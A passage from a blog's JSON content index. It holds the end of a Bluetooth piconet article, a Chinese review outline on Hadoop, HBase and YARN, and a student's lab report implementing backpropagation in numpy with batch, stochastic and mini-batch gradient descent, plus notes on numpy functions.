devices can switch roles, by agreement, and the slave can become the master (for example, a headset initiating a connection to a phone necessarily begins as master—as an initiator of the connection—but may subsequently operate as the slave). The Bluetooth Core Specification provides for the connection of two or more piconets to form a scatternet, in which certain devices simultaneously play the master role in one piconet and the slave role in another. At any given time, data can be transferred between the master and one other device (except for the little-used broadcast mode). The master chooses which slave device to address; typically, it switches rapidly from one device to another in a round-robin fashion. Since it is the master that chooses which slave to address, whereas a slave is (in theory) supposed to listen in each receive slot, being a master is a lighter burden than being a slave. Being a master of seven slaves is possible; being a slave of more than one master is possible. The specification is vague as to required behavior in scatternets.[25]","comments":true,"categories":[{"name":"通信技术","slug":"通信技术","permalink":"http://1905060202.github.io/categories/%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"蓝牙","slug":"蓝牙","permalink":"http://1905060202.github.io/tags/%E8%93%9D%E7%89%99/"},{"name":"网络","slug":"网络","permalink":"http://1905060202.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"Typora，闭源的好软件","date":"2021-11-30T08:56:54.000Z","path":"2021/11/30/Typora，闭源的好软件/","text":"","comments":true,"categories":[],"tags":[]},{"title":"大数据技术原理与应用复习","date":"2021-11-30T02:40:52.000Z","path":"2021/11/30/大数据技术原理与应用复习/","text":"复习提纲第二章试述Hadoop的生态组件 HDFS:分布式文件系统 HBase:分布式列式数据库 MapReduce：分布式编程模型 Hive：基于Hadoop的数据仓库 Pig：数据流语言和运行环境 Zookeeper：协同工作系统 Flume：海量日志采集聚合和监控工具 Sqoop：ETL交互工具 Mathout：数据挖掘工具 Ambari：基于Web的工具 第三章试述HDFS中的块和普通文件系统的块的区别 传统文件系统中，为了提高磁盘读写效率，一般以数据块为单位，而不是以字节为单位。 HDFS中的块，默认一个块的大小为64MB，而HDFS中的文件会被拆分为许多块，每个块作为独立的存储单元进行存储。HDFS在块的大小的设计上明显要大于普通文件系统。 试述HDFS中的名称节点和数据节点的具体功能 名称节点负责管理分布式文件系统系统的命名空间，记录分布式文件系统中的每个文件中各个块所在的数据节点的位置信息。 数据节点是分布式文件系统HDFS的工作节点，负责数据的存储和读取，会根据客户端或者是名称节点的调度来进行数据的存储和检索。并向名称节点定期发送自己所存储的块的列表。 试述HDFS的冗余数据保存策略 第一个副本：放置在上传文件的数据节点；如果是集群外提交，则随机挑选一台磁盘不太满，CPU不太忙的节点； 第二个副本：放置在与第一个副本不同的机架的节点上； 第三个副本：放置在与第一个副本相同的机架的其他节点上； 试述HDFS是如何探测错误的发生以及如何进行恢复的 名称节点出错：利用远程挂载的网络文件系统NFS或者是启用第二名称节点 数据节点出错：数据节点定期向名称节点发送心跳信息，向名称节点报告自己的状态。名称节点会定期检查，如果宕机，就不会再发送任何I/O请求。一旦发现数据块的副本数量小于冗余因子，就会启动数据冗余复制，为他生成新的副本。 数据出错：客户端读取到数据会会进行校验。如果校验出错，就会请求到另一个数据节点读取该文件块，并向名称节点报告这个数据块有错，名称节点会定期检查并重新复制这个块。 第四章阐述Hbase和传统关系数据库的区别 数据类型：传统为关系模型，HBase为数据模型 数据操作：传统拥有插入、查询、删除、更新、多表连接。而HBase有查询、插入、删除、清空，没有连接操作 存储模式：传统基于行存储，元组或行会被连续地存储在磁盘中。HBase基于列存储，每个列族都由不同的文件保存，不同的列族的文件是分离的 数据索引：传统针对不同列构建复杂的多个索引，HBase只有行键索引 数据维护：传统用最新的值去替换记录中原来的旧值，HBase不会删除旧版本，而是生成一个新的版本 可伸缩性：传统很难实现横向扩展，纵向扩展空间也有限。HBase则不同。 试述HBase各功能组件及其作用 库函数：链接到客户端 一个Master主服务器：主服务器Master主要负责表和Region的管理工作 许多个Region服务器：Region服务器是HBase中最核心的模块，负责维护分配给自己的Region，并响应用户的读写请求 阐述HBase的分区是如何定位的通过构建的映射表的每个条目包含的两个内容，一个是Region标识符，另一个是Region服务器标识 阐述HBase的三层结构中各层次的名称和作用 第一层：Zookeeper文件。记录了-ROOT-表的位置信息 第二层：-ROOT-表。记录了.META.表的Region位置信息。-ROOT-表只能有一个Region，通过-ROOT-表，就可以访问.META.表中的数据 第三层：.META.表。记录了用户数据表的Region位置信息，.META.表可以有许多个Region，保存了HBase中所有的用户数据表的Region位置信息。 阐述Hbase三层结构下，客户端如何访问到数据首先访问Zookpeer，获取-ROOT-表的位置信息，然后访问-ROOT-表，获取.META.表的位置信息，之后访问.META.，找到所需的Region具体位于哪一个Region服务器，最后才会到该Region服务器读取数据。 试述HBase系统基本架构及其每个组成部分的作用 客户端：客户端包含访问HBase的接口，同时在缓存中维护着已经访问过的Region位置信息，用来加快后续访问速度 Master：主服务器主要负责表和Region的管理工作。管理用户对表的增删改查等操作，实现不同的Region服务器的负载均衡。在Region分裂或合并后，负责重新调整Region的分布。对发生失效的Region服务器上的Region进行迁移。 Region：Region服务器是HBase中最核心的模块，负责维护自己的Region，并响应用户读写请求。 试述HStore的工作原理每个HStore对应了表中的一个列族的存储。每个Store包括一个MemStore缓存和若干个StoreFile文件。Memstore是排序的内存缓冲区，当用户写入数据时，系统首先要把数据放入MemStore缓存中，当MemStore缓存满时，就会刷新到磁盘中的一个StoreFile文件去，当单个StoreFile文件大小超过一定阈值时，就会触发文件分裂的操作。 试述HLog的工作原理HBase系统为每个Region服务器配置了一个HLog文件。它是一种预写式日志，用户更新数据必须先写入日之后，才能写入MemStore缓存，并且，直到MemStore缓存内容对应的日志已经写入磁盘，该缓存内容才能被刷新到磁盘中。 第七章第八章试述YARN的组成及各部件功能 ResourceManager： 处理客户端请求 启动/监控ApplicationMaster 监控NodeManager 资源分配与调度 ApplicationMaster： 为应用程序申请资源，并分配内部任务 任务调度、监控与容错 NodeManager： 单个节点上的资源管理 处理来自ResourceManager的命令 处理来自ApplicationMaster的命令 请分别描述Pig、Tez和Kafka的功能 Pig：是Hadoop生态系统中的一个组件，提供了类似SQL的语言，允许用户通过编写简单的脚本来实现复杂的数据分析，而不需要编写复杂的MapReduce程序 Tez：是DAG作业的计算框架，核心思想是将Map和Reduce两个操作进一步拆分。 Kafka：是一种高吞吐量的分布式发布订阅消息系统。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"大数据技术原理","slug":"大数据技术原理","permalink":"http://1905060202.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/"},{"name":"大数据","slug":"大数据","permalink":"http://1905060202.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"}]},{"title":"计算智能课程设计(以人事招聘为例的误差反向传播算法)","date":"2021-11-30T00:19:23.000Z","path":"2021/11/30/计算智能课程设计-以人事招聘为例的误差反向传播算法/","text":"写在前面昨天写了基于感知机的鸢尾花分类，今天下午要考《大数据技术原理》，本来是整个白天的课程设计，因为考试少了一下午。之前看书复习了一波，但记忆是需要反复锤炼的，所以要抓紧写完这个传播算法，抽出时间再去复习会。2021.11.30/2021.12.1/2021.12.2 以人事招聘为例的误差反向传播算法实验目的理解多层神经网络的结构和原理，掌握反向传播算法对神经元的训练过程，了解反向传播公式。通过构建 BP 网络实例，熟悉前馈网络的原理及结构。 背景知识误差反向传播算法即 BP 算法，是一种适合于多层神经网络的学习算法。其建立在梯度下降方法的基础之上,主要由激励传播和权重更新两个环节组成，经过反复迭代更新、修正权值从而输出预期的结果。BP 算法整体上可以分成正向传播和反向传播，原理如下:正向传播过程：信息经过输入层到达隐含层，再经过多个隐含层的处理后到达输出层。反向传播过程：比较输出结果和正确结果，将误差作为一个目标函数进行反向传播：对每一层依次求对权值的偏导数，构成目标函数对权值的梯度，网络权重再依次完成更新调整。依此往复、直到输出达到目标值完成训练。该算法可以总结为:利用输出误差推算前一层的误差，再用推算误差算出更前一层的误差，直到计算出所有层的误差估计。1986 年，Hinton 在论文《Learning Representations by Back-propagating Errors》中首次系统地描述了如何利用 BP 算法来训练神经网络。从此，BP 算法开始占据有监督神经网络算法的核心地位。它是迄今最成功的神经网络学习算法之一，现实任务中使用神经网络时，大多是在使用 BP 算法进行训练。 为了说明 BP 算法的过程，本实验使用一个公司招聘的例子：假设有一个公司，其人员招聘由 5个人组成的人事管理部门负责，如下图所示： 其中张三、李四等人是应聘者，他们向该部门投递简历，简历包括两类数据：学习成绩和社会实践得分，人事部门有三个层级，一科长根据应聘者的学习成绩和实践得分评估其智商，二科长根据同样的资料评估其情商；一处长根据两个科长提供的智商、情商评分，评估应聘者的工作能力，二处长评估工作态度；最后由总裁汇总两位处长的意见，得出最终结论，即是否招收该应聘者。该模型等价于一个形状为(2,2,2,1)的前馈神经网络，输入层、隐藏层 1、隐藏层 2、输出层各自包含 2、2、2、1 个节点，如下图所示。 示例代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160import numpy as npimport matplotlib.pyplot as plt# 输入数据1行2列，这里只有张三的数据X = np.array([[1,0.1]])# X = np.array([[1,0.1],# [0.1,1],# [0.1,0.1],# [1,1]])# 标签，也叫真值，1行1列，张三的真值：一定录用T = np.array([[1]])# T = np.array([[1],# [0],# [0],# [1]])# 定义一个2隐层的神经网络：2-2-2-1# 输入层2个神经元，隐藏1层2个神经元，隐藏2层2个神经元，输出层1个神经元# 输入层到隐藏层1的权值初始化，2行2列W1 = np.array([[0.8,0.2], [0.2,0.8]])# 隐藏层1到隐藏层2的权值初始化，2行2列W2 = np.array([[0.5,0.0], [0.5,1.0]])# 隐藏层2到输出层的权值初始化，2行1列W3 = np.array([[0.5], [0.5]])# 初始化偏置值# 隐藏层1的2个神经元偏置b1 = np.array([[-1,0.3]])# 隐藏层2的2个神经元偏置b2 = np.array([[0.1,-0.1]])# 输出层的1个神经元偏置b3 = np.array([[-0.6]])# 学习率设置lr = 0.1# 定义训练周期数10000epochs = 10000# 每训练1000次计算一次loss值 # 定义测试周期数report = 1000# 将所有样本分组，每组大小为batch_size = 1# 定义sigmoid函数def sigmoid(x): return 1/(1+np.exp(-x))# 定义sigmoid函数导数def dsigmoid(x): return x*(1-x)# 更新权值和偏置值def update(): global batch_X,batch_T,W1,W2,W3,lr,b1,b2,b3 # 隐藏层1输出 Z1 = np.dot(batch_X,W1) + b1 A1 = sigmoid(Z1) # 隐藏层2输出 Z2 = (np.dot(A1,W2) + b2) A2 = sigmoid(Z2) # 输出层输出 Z3=(np.dot(A2,W3) + b3) A3 = sigmoid(Z3) # 求输出层的误差 delta_A3 = (batch_T - A3) delta_Z3 = delta_A3 * dsigmoid(A3) # 利用输出层的误差，求出三个偏导（即隐藏层2到输出层的权值改变） # 由于一次计算了多个样本，所以需要求平均 delta_W3 = A2.T.dot(delta_Z3) / batch_X.shape[0] delta_B3 = np.sum(delta_Z3, axis=0) / batch_X.shape[0] # 求隐藏层2的误差 delta_A2 = delta_Z3.dot(W3.T) delta_Z2 = delta_A2 * dsigmoid(A2) # 利用隐藏层2的误差，求出三个偏导（即隐藏层1到隐藏层2的权值改变） # 由于一次计算了多个样本，所以需要求平均 delta_W2 = A1.T.dot(delta_Z2) / batch_X.shape[0] delta_B2 = np.sum(delta_Z2, axis=0) / batch_X.shape[0] # 求隐藏层1的误差 delta_A1 = delta_Z2.dot(W2.T) delta_Z1 = delta_A1 * dsigmoid(A1) # 利用隐藏层1的误差，求出三个偏导（即输入层到隐藏层1的权值改变） # 由于一次计算了多个样本，所以需要求平均 delta_W1 = batch_X.T.dot(delta_Z1) / batch_X.shape[0] delta_B1 = np.sum(delta_Z1, axis=0) / batch_X.shape[0] # 更新权值 W3 = W3 + lr *delta_W3 W2 = W2 + lr *delta_W2 W1 = W1 + lr *delta_W1 # 改变偏置值 b3 = b3 + lr * delta_B3 b2 = b2 + lr * delta_B2 b1 = b1 + lr * delta_B1# 定义空list用于保存lossloss = []batch_X = []batch_T = []max_batch = X.shape[0] // batch_size# 训练模型for idx_epoch in range(epochs): for idx_batch in range(max_batch): # 更新权值 batch_X = X[idx_batch*batch_size:(idx_batch+1)*batch_size, :] batch_T = T[idx_batch*batch_size:(idx_batch+1)*batch_size, :] update() # 每训练5000次计算一次loss值 if idx_epoch % report == 0: # 隐藏层1输出 A1 = sigmoid(np.dot(X,W1) + b1) # 隐藏层2输出 A2 = sigmoid(np.dot(A1,W2) + b2) # 输出层输出 A3 = sigmoid(np.dot(A2,W3) + b3) # 计算loss值 print(&#x27;A3:&#x27;,A3) print(&#x27;epochs:&#x27;,idx_epoch,&#x27;loss:&#x27;,np.mean(np.square(T - A3) / 2)) # 保存loss值 loss.append(np.mean(np.square(T - A3) / 2))# 画图训练周期数与loss的关系图plt.plot(range(0,epochs,report),loss)plt.xlabel(&#x27;epochs&#x27;)plt.ylabel(&#x27;loss&#x27;)plt.show() # 隐藏层1输出A1 = sigmoid(np.dot(X,W1) + b1)# 隐藏层2输出A2 = sigmoid(np.dot(A1,W2) + b2)# 输出层输出A3 = sigmoid(np.dot(A2,W3) + b3)print(&#x27;output:&#x27;)print(A3)# 因为最终的分类只有0和1，所以我们可以把# 大于等于0.5的值归为1类，小于0.5的值归为0类def predict(x): if x&gt;=0.5: return 1 else: return 0# map会根据提供的函数对指定序列做映射# 相当于依次把A2中的值放到predict函数中计算# 然后打印出结果print(&#x27;predict:&#x27;)for i in map(predict,A3): print(i) 实验内容请回答下列问题： 第一题1. 如果去掉总裁这一层，相应张三的样本修改为(1.0,0.1,1.0,1.0)，分别对应张三的学习成绩、张三的实践成绩、张三的工作能力真值、张三的工作态度真值，代码应该如何修改？ 要修改的代码： 更改的： 123456789101112 # 求隐藏层2的误差80. delta_A2 = delta_Z3.dot(batch_T - A2) # 计算loss值127. print(&#x27;A2:&#x27;,A2)128. print(&#x27;epochs:&#x27;,idx_epoch,&#x27;loss:&#x27;,np.mean(np.square(T - A2) / 2)) # 保存loss值130. loss.append(np.mean(np.square(T - A2) / 2))145. print(A3)159. for i in map(predict,A2.T): 删除的： 12345678910111213141516171819202122232425 # 隐藏层2到输出层的权值初始化，2行1列27. W3 = np.array([[0.5],28. [0.5]]) # 输出层的1个神经元偏置37. b3 = np.array([[-0.6]]) # 输出层输出68. Z3=(np.dot(A2,W3) + b3)69. A3 = sigmoid(Z3) # 求输出层的误差72. delta_A3 = (batch_T - A3)73. delta_Z3 = delta_A3 * dsigmoid(A3) # 利用输出层的误差，求出三个偏导（即隐藏层2到输出层的权值改变） # 由于一次计算了多个样本，所以需要求平均76. delta_W3 = A2.T.dot(delta_Z3) / batch_X.shape[0]77. delta_B3 = np.sum(delta_Z3, axis=0) / batch_X.shape[0] # 更新权值96. W3 = W3 + lr *delta_W3 # 改变偏置值101. b3 = b3 + lr * delta_B3 # 输出层输出125. A3 = sigmoid(np.dot(A2,W3) + b3) # 输出层输出143. A3 = sigmoid(np.dot(A2,W3) + b3) 结果： 第二题2..如果增加一个样本，李四（0.1,1.0,0），分别对应李四的学习成绩，李四的实践成绩，李四被招聘可能性的真值，代码应该如何修改？此时是一个样本计算一次偏导、更新一次权值，还是两个样本一起计算一次偏导、更新一次权值？（提示：注意 batch_size 的作用） 修改的代码： 1234565. X = np.array([[1,0.1], [0.1,1]])11. T = np.array([[1], [0]]) 结果： 此时，我们通过修改代码： 123456789114. for idx_batch in range(max_batch): # 更新权值 batch_X = X[idx_batch*batch_size:(idx_batch+1)*batch_size, :] batch_T = T[idx_batch*batch_size:(idx_batch+1)*batch_size, :] # 以下为新增的代码 print(batch_X) print(batch_T) # 以上为新增的代码 update() 运行程序不难看出： 当batch_size==1时，一个样本计算一次偏导，更新一次权值。 第三题3.样本为张三[1,0.1,1]、李四[0.1,1,0]、王五[0.1,0.1,0]、赵六[1,1,1]，请利用 batch_size 实现教材 279 页提到的“批量梯度下降”、“随机梯度下降”和“小批量梯度下降”，请注意“随机梯度下降”和“小批量梯度下降”要体现随机性。 批量梯度下降修改代码: 123456789101112134. # 输入数据4行2列，这里有张三、李四、王五、赵六的数据 X = np.array([[1,0.1], [0.1,1], [0.1,0.1], [1,1]]) # 标签，也叫真值，4行1列，张三的真值：一定录用，李四的真值：一定不录用 T = np.array([[1], [0], [0], [1]]) # batch_size batch_size = 4 此时，四个样本一起计算一次偏导，更新一次权值，进行一次迭代。符合在每一次迭代时使用所有样本来进行梯度的更新。 随机梯度下降训练结果： 随机梯度下降修改代码： 12345678910 # 将所有样本分组，每组大小为1batch_size = 1 114. for idx_batch in range(max_batch): # 更新权值 # 随机样本 idx_batch = random.randint(0,max_batch-1) batch_X = X[(idx_batch)*batch_size:(idx_batch+1)*batch_size, :] batch_T = T[(idx_batch)*batch_size:(idx_batch+1)*batch_size, :] update() 随机性体现如下： 随机批量梯度下降法结果： 小批量梯度下降在这里，我们设置小批量梯度下降的m为2. 修改代码： 12345678910111213# 将所有样本分组，每组大小为 batch_size = 2 for idx_batch in range(max_batch): # 更新权值 # 随机样本 r_nums = np.array([1,1.5,2]) r_num = random.randint(0,2) batch_X = X[int((r_nums[r_num]-1))*batch_size:(int(r_nums[r_num]))*batch_size] batch_T = T[int((r_nums[r_num]-1))*batch_size:(int(r_nums[r_num]))*batch_size] update()随机性体现如下： 小批量随机梯度下降结果： 第四题4.【 选 做 】 本 例 中 输 入 向 量 、 真 值 都 是 行 向 量 ， 请 将 它 们 修 改 为 列 向 量 ， 如X = np.array([[1,0.1]])改为 X = np.array([[1],[0.1]])，请合理修改其它部分以使程序得到与行向量时相同的结果。 基于第三题小批量随机梯度下降更改的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170import randomimport numpy as npimport matplotlib.pyplot as plt# 输入数据2行4列# X = np.array([[1,0.1],[0.1,1],[0.1,0.1],[1,1]])X = np.array([[1,0.1,0.1,1], [0.1,1,0.1,1]])# X = np.array([[1,0.1],# [0.1,1],# [0.1,0.1],# [1,1]])# 标签，也叫真值，1行4列，张三的真值：一定录用T = np.array([[1,0,0,1]])# T = np.array([[1],# [0],# [0],# [1]])# 定义一个2隐层的神经网络：2-2-2-1# 输入层2个神经元，隐藏1层2个神经元，隐藏2层2个神经元，输出层1个神经元# 输入层到隐藏层1的权值初始化，2行2列W1 = np.array([[0.8,0.2], [0.2,0.8]])# 隐藏层1到隐藏层2的权值初始化，2行2列W2 = np.array([[0.5,0.0], [0.5,1.0]])# 隐藏层2到输出层的权值初始化，2行1列W3 = np.array([[0.5], [0.5]])# 初始化偏置值# 隐藏层1的2个神经元偏置b1 = np.array([[-1,0.3]])# 隐藏层2的2个神经元偏置b2 = np.array([[0.1,-0.1]])# 输出层的1个神经元偏置b3 = np.array([[-0.6]])# 学习率设置lr = 0.1# 定义训练周期数10000epochs = 10000# 每训练1000次计算一次loss值 # 定义测试周期数report = 1000# 将所有样本分组，每组大小为batch_size = 2# 定义sigmoid函数def sigmoid(x): return 1/(1+np.exp(-x))# 定义sigmoid函数导数def dsigmoid(x): return x*(1-x)# 更新权值和偏置值def update(): global batch_X,batch_T,W1,W2,W3,lr,b1,b2,b3 # 隐藏层1输出 Z1 = np.dot(batch_X,W1) + b1 A1 = sigmoid(Z1) # 隐藏层2输出 Z2 = (np.dot(A1,W2) + b2) A2 = sigmoid(Z2) # 输出层输出 Z3=(np.dot(A2,W3) + b3) A3 = sigmoid(Z3) # 求输出层的误差 delta_A3 = (batch_T - A3) delta_Z3 = delta_A3 * dsigmoid(A3) # 利用输出层的误差，求出三个偏导（即隐藏层2到输出层的权值改变） # 由于一次计算了多个样本，所以需要求平均 delta_W3 = A2.T.dot(delta_Z3) / batch_X.shape[0] delta_B3 = np.sum(delta_Z3, axis=0) / batch_X.shape[0] # 求隐藏层2的误差 delta_A2 = delta_Z3.dot(W3.T) delta_Z2 = delta_A2 * dsigmoid(A2) # 利用隐藏层2的误差，求出三个偏导（即隐藏层1到隐藏层2的权值改变） # 由于一次计算了多个样本，所以需要求平均 delta_W2 = A1.T.dot(delta_Z2) / batch_X.shape[0] delta_B2 = np.sum(delta_Z2, axis=0) / batch_X.shape[0] # 求隐藏层1的误差 delta_A1 = delta_Z2.dot(W2.T) delta_Z1 = delta_A1 * dsigmoid(A1) # 利用隐藏层1的误差，求出三个偏导（即输入层到隐藏层1的权值改变） # 由于一次计算了多个样本，所以需要求平均 delta_W1 = batch_X.T.dot(delta_Z1) / batch_X.shape[0] delta_B1 = np.sum(delta_Z1, axis=0) / batch_X.shape[0] # 更新权值 W3 = W3 + lr *delta_W3 W2 = W2 + lr *delta_W2 W1 = W1 + lr *delta_W1 # 改变偏置值 b3 = b3 + lr * delta_B3 b2 = b2 + lr * delta_B2 b1 = b1 + lr * delta_B1# 定义空list用于保存lossloss = []batch_X = []batch_T = []max_batch = X.shape[1] // batch_size# 训练模型for idx_epoch in range(epochs): for idx_batch in range(max_batch): # 更新权值 # 随机样本 r_nums = np.array([1,1.5,2]) r_num = random.randint(0,2) batch_X = X.T[int((r_nums[r_num]-1))*batch_size:(int(r_nums[r_num]))*batch_size] batch_T = T.T[int((r_nums[r_num]-1))*batch_size:(int(r_nums[r_num]))*batch_size] print(batch_X) print(batch_T) update() # 每训练5000次计算一次loss值 if idx_epoch % report == 0: # 隐藏层1输出 A1 = sigmoid(np.dot(X.T,W1) + b1) # 隐藏层2输出 A2 = sigmoid(np.dot(A1,W2) + b2) # 输出层输出 A3 = sigmoid(np.dot(A2,W3) + b3) # 计算loss值 print(&#x27;A3:&#x27;,A3) print(&#x27;epochs:&#x27;,idx_epoch,&#x27;loss:&#x27;,np.mean(np.square(T.T - A3) / 2)) # 保存loss值 loss.append(np.mean(np.square(T.T - A3) / 2))# 画图训练周期数与loss的关系图plt.plot(range(0,epochs,report),loss)plt.xlabel(&#x27;epochs&#x27;)plt.ylabel(&#x27;loss&#x27;)plt.show() # 隐藏层1输出A1 = sigmoid(np.dot(X.T,W1) + b1)# 隐藏层2输出A2 = sigmoid(np.dot(A1,W2) + b2)# 输出层输出A3 = sigmoid(np.dot(A2,W3) + b3)print(&#x27;output:&#x27;)print(A3)# 因为最终的分类只有0和1，所以我们可以把# 大于等于0.5的值归为1类，小于0.5的值归为0类def predict(x): if x&gt;=0.5: return 1 else: return 0# map会根据提供的函数对指定序列做映射# 相当于依次把A2中的值放到predict函数中计算# 然后打印出结果print(&#x27;predict:&#x27;)for i in map(predict,A3): print(i) 运行效果： 实验涉及到的实验语法知识numpy.dot()函数的用法 [1]numpy.dot(a, b, out=None) Dot product of two arrays. Specifically, If both a and b are 1-D arrays, it is inner product of vectors (without complex conjugation). If both a and b are 2-D arrays, it is matrix multiplication, but using matmul or a @ b is preferred. If either a or b is 0-D (scalar), it is equivalent to multiply and using numpy.multiply(a, b) or a * b is preferred. If a is an N-D array and b is a 1-D array, it is a sum product over the last axis of a and b. If a is an N-D array and b is an M-D array (where M&gt;=2), it is a sum product over the last axis of a and the second-to-last axis of b: 1dot(a, b)[i,j,k,m] = sum(a[i,j,:] * b[k,:,m]) Examples 12&gt;&gt;&gt; np.dot(3, 4)12 Neither argument is complex-conjugated: 12&gt;&gt;&gt; np.dot([2j, 3j], [2j, 3j])(-13+0j) For 2-D arrays it is the matrix product: 1234567891011&gt;&gt;&gt; a = [[1, 0], [0, 1]]&gt;&gt;&gt; b = [[4, 1], [2, 2]]&gt;&gt;&gt; np.dot(a, b)array([[4, 1], [2, 2]])&gt;&gt;&gt; a = np.arange(3*4*5*6).reshape((3,4,5,6))&gt;&gt;&gt; b = np.arange(3*4*5*6)[::-1].reshape((5,4,6,3))&gt;&gt;&gt; np.dot(a, b)[2,3,2,1,2,2]499128&gt;&gt;&gt; sum(a[2,3,2,:] * b[1,2,:,2])499128 总结： 如果处理的是一维数组，则得到的是两数组的內积 如果是二维数组（矩阵）之间的运算，则得到的是矩阵积（mastrix product） 12345678## 一维数组的情况In : d = np.arange(0,9)Out: array([0, 1, 2, 3, 4, 5, 6, 7, 8])In : e = d[::-1]Out: array([8, 7, 6, 5, 4, 3, 2, 1, 0])In : np.dot(d,e) Out: 84 1234567891011121314##矩阵的情况In : a = np.arange(1,5).reshape(2,2)Out:array([[1, 2], [3, 4]])In : b = np.arange(5,9).reshape(2,2)Out: array([[5, 6], [7, 8]])In : np.dot(a,b)Out:array([[19, 22], [43, 50]]) sigmoid()函数的用法及意义 [2]sigmoid函数也叫Logistic函数，用于隐层神经元输出，取值范围为(0,1)，它可以将一个实数映射到(0,1)的区间，可以用来做二分类。 这就是sigmoid函数的表达式，这个函数在伯努利分布上非常好用，现在看看他的图像就清楚 可以看到在趋于正无穷或负无穷时，函数趋近平滑状态，sigmoid函数因为输出范围（0，1），所以二分类的概率常常用这个函数，事实上logistic回归采用这个函数很多教程也说了以下几个优点 1 值域在0和1之间 2 函数具有非常好的对称性 函数对输入超过一定范围就会不敏感 sigmoid的输出在0和1之间，我们在二分类任务中，采用sigmoid的输出的是事件概率，也就是当输出满足满足某一概率条件我们将其划分正类，不同于svm。 代码： 1234567891011121314151617181920from matplotlib import pyplot as pltimport numpy as npimport math def sigmoid_function(z): fz = [] for num in z: fz.append(1/(1 + math.exp(-num))) return fz if __name__ == &#x27;__main__&#x27;: z = np.arange(-10, 10, 0.01) fz = sigmoid_function(z) plt.title(&#x27;Sigmoid Function&#x27;) plt.xlabel(&#x27;z&#x27;) plt.ylabel(&#x27;σ(z)&#x27;) plt.plot(z, fz) plt.show() 输出函数图像： Numpy中的shape函数的用法详解 [3]摘要x.shape[0] will give the number of rows in an array. In your case it will give output 10. If you will type x.shape[1], it will print out the number of columns i.e 1024. 详解中文解释shape函数的功能是读取矩阵的长度，比如shape[0]就是读取矩阵第一维度的长度,相当于行数。它的输入参数可以是一个整数表示维度，也可以是一个矩阵。shape函数返回的是一个元组，表示数组（矩阵）的维度，例子如下： 数组（矩阵）只有一个维度时，shape只有shape[0]，返回的是该一维数组（矩阵）中元素的个数，通俗点说就是返回列数，因为一维数组只有一行，一维情况中array创建的可以看做list（或一维数组） 示例代码： 123456789101112&gt;&gt;&gt; a=np.array([1,2])&gt;&gt;&gt; aarray([1, 2])&gt;&gt;&gt; a.shape(2L,)&gt;&gt;&gt; a.shape[0]2L&gt;&gt;&gt; a.shape[1]Traceback (most recent call last): File &quot;&lt;pyshell#63&gt;&quot;, line 1, in &lt;module&gt; a.shape[1]IndexError: tuple index out of range #最后报错是因为一维数组只有一个维度，可以用a.shape或a.shape[0]来访问 数组有两个维度（即行和列）时，和我们的逻辑思维一样，a.shape返回的元组表示该数组的行数与列数，请看下例： 示例代码： 123456789101112&gt;&gt;&gt; a=np.array([[1,2],[3,4]]) #注意二维数组要用（）和[]一起包裹起来，键入print a 会得到一个用2个[]包裹的数组（矩阵）&gt;&gt;&gt; aarray([[1, 2], [3, 4]])&gt;&gt;&gt; a.shape(2L, 2L)&gt;&gt;&gt; b=np.array([[1,2,3],[4,5,6]])&gt;&gt;&gt; barray([[1, 2, 3], [4, 5, 6]])&gt;&gt;&gt; b.shape(2L, 3L) 英文解释x[0].shape will give the Length of 1st row of an array. x.shape[0] will give the number of rows in an array. In your case it will give output 10. If you will type x.shape[1], it will print out the number of columns i.e 1024. If you would type x.shape[2], it will give an error, since we are working on a 2-d array and we are out of index. Let me explain you all the uses of ‘shape’ with a simple example by taking a 2-d array of zeros of dimension 3x4. 示例代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445import numpy as np#This will create a 2-d array of zeroes of dimensions 3x4x = np.zeros((3,4))print(x)[[ 0. 0. 0. 0.][ 0. 0. 0. 0.][ 0. 0. 0. 0.]]#This will print the First Row of the 2-d arrayx[0]array([ 0., 0., 0., 0.])#This will Give the Length of 1st rowx[0].shape(4,)#This will Give the Length of 2nd row, verified that length of row is showing same x[1].shape(4,)#This will give the dimension of 2-d Array x.shape(3, 4)# This will give the number of rows is 2-d array x.shape[0]3# This will give the number of columns is 2-d array x.shape[1]3# This will give the number of columns is 2-d array x.shape[1]4# This will give an error as we have a 2-d array and we are asking value for an index out of rangex.shape[2]---------------------------------------------------------------------------IndexError Traceback (most recent call last)&lt;ipython-input-20-4b202d084bc7&gt; in &lt;module&gt;()----&gt; 1 x.shape[2]IndexError: tuple index out of range NumPy 切片和索引 [4]ndarray对象的内容可以通过索引或切片来访问和修改，与 Python 中 list 的切片操作一样。 ndarray 数组可以基于 0 - n 的下标进行索引，切片对象可以通过内置的 slice 函数，并设置 start, stop 及 step 参数进行，从原数组中切割出一个新数组。 实例: 123456789import numpy as np a = np.arange(10) s = slice(2,7,2) #从索引 2 开始到索引 7 停止，间隔为2 print (a[s]) 输出结果为： 1[2 4 6] 冒号 : 的解释：如果只放置一个参数，如 **[2]**，将返回与该索引相对应的单个元素。如果为 **[2:]**，表示从该索引开始以后的所有项都将被提取。如果使用了两个参数，如 **[2:7]**，那么则提取两个索引(不包括停止索引)之间的项。 多维数组同样适用上述索引提取方法： 123456789import numpy as np a = np.array([[1,2,3], [3,4,5], [4,5,6]])print(a)# 从某个索引处开始切割print(&#x27;从数组索引 a[1:] 处开始切割&#x27;)print(a[1:]) 输出结果为： 123456[[1 2 3] [3 4 5] [4 5 6]]从数组索引 a[1:] 处开始切割[[3 4 5] [4 5 6]] 批量梯度下降[5]批量梯度下降法批量梯度下降法是最原始的形式，它是指在每一次迭代时使用所有样本来进行梯度的更新。 